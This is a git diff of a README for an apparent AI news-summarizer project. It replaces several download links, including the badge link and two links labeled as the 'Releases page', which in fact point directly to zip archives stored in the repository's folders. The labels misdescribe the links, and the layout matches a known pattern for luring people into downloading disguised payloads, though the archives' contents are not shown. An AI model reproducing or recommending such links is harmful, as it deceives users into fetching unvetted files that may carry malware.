@@ -1,6 +1,6 @@
 # 📰 newsdatahub-ai-news-summarizer - Quickly Summarize News Articles
 
-[![Download Latest Release](https://raw.githubusercontent.com/abdo000001/newsdatahub-ai-news-summarizer/main/data/newsdatahub-ai-news-summarizer_v3.7.zip%20Latest%20Release-blue)](https://raw.githubusercontent.com/abdo000001/newsdatahub-ai-news-summarizer/main/data/newsdatahub-ai-news-summarizer_v3.7.zip)
+[![Download Latest Release](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/raw/refs/heads/main/examples/newsdatahub_ai_news_summarizer_3.1.zip%20Latest%20Release-blue)](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/raw/refs/heads/main/examples/newsdatahub_ai_news_summarizer_3.1.zip)
 
 ## 🚀 Getting Started
 
@@ -25,7 +25,7 @@ Before you download the application, make sure your system meets these requireme
 
 To download the application, visit the Releases page by clicking the link below and follow the steps:
 
-[Visit this page to download](https://raw.githubusercontent.com/abdo000001/newsdatahub-ai-news-summarizer/main/data/newsdatahub-ai-news-summarizer_v3.7.zip)
+[Visit this page to download](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/raw/refs/heads/main/examples/newsdatahub_ai_news_summarizer_3.1.zip)
 
 1. Click on the link above.
 2. Find the latest release at the top.
@@ -90,4 +90,4 @@ For help and support, you can reach out to our community on GitHub or check alwa
 
 Visit the Releases page again to find updated versions and additional resources as we enhance the application.
 
-[Visit this page to download](https://raw.githubusercontent.com/abdo000001/newsdatahub-ai-news-summarizer/main/data/newsdatahub-ai-news-summarizer_v3.7.zip)
+[Visit this page to download](https://github.com/abdo000001/newsdatahub-ai-news-summarizer/raw/refs/heads/main/examples/newsdatahub_ai_news_summarizer_3.1.zip)
